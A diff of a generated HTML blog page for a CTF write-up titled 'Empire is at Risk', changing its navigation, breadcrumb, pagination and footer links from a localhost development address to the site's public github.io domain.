@@ -81,7 +161,7 @@ Navigating through some posts, a very good one that I used as a reference while 
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
+            <a href="https://connar.github.io/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -107,42 +187,42 @@ Navigating through some posts, a very good one that I used as a reference while 
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/categories/" title="Categories">
+                <a href="https://connar.github.io/categories/" title="Categories">
                     <span>Categories</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags/" title="Tags">
+                <a href="https://connar.github.io/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/mychallenges/" title="My Challenges">
+                <a href="https://connar.github.io/mychallenges/" title="My Challenges">
                     <span>My Challenges</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/posts/" title="Posts">
+                <a href="https://connar.github.io/posts/" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/projects/" title="Projects">
+                <a href="https://connar.github.io/projects/" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/training/" title="Training">
+                <a href="https://connar.github.io/training/" title="Training">
                     <span>Training</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about/" title="About">
+                <a href="https://connar.github.io/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://connar.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
@@ -153,7 +233,7 @@ Navigating through some posts, a very good one that I used as a reference while 
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/ctfwriteups/">Ctfwriteups</a></div>
+    <div class="breadcrumbs"><a href="https://connar.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://connar.github.io/ctfwriteups/">Ctfwriteups</a></div>
     <h1 class="post-title entry-hint-parent">
       Empire is at Risk - Writeup
     </h1>
@@ -778,12 +858,12 @@ p).......I.,Ft..&gt;.m.GK..&#39;...m..*..P...&#34;...b&#34;.#q --more bytes--
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/ctfwriteups/chinesewindowsupgrader/">
+  <a class="prev" href="https://connar.github.io/ctfwriteups/chinesewindowsupgrader/">
     <span class="title">« Prev</span>
     <br>
     <span>Chinese Windows Updater - Writeup</span>
   </a>
-  <a class="next" href="http://localhost:1313/ctfwriteups/flagontherun/">
+  <a class="next" href="https://connar.github.io/ctfwriteups/flagontherun/">
     <span class="title">Next »</span>
     <br>
     <span>Flag on the run - Writeup</span>
@@ -795,7 +875,7 @@ p).......I.,Ft..&gt;.m.GK..&#39;...m..*..P...&#34;...b&#34;.#q --more bytes--
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">Journal of Connar</a></span> · 
+        <span>&copy; 2025 <a href="https://connar.github.io/">Journal of Connar</a></span> · 
 
     <span>
         Powered by
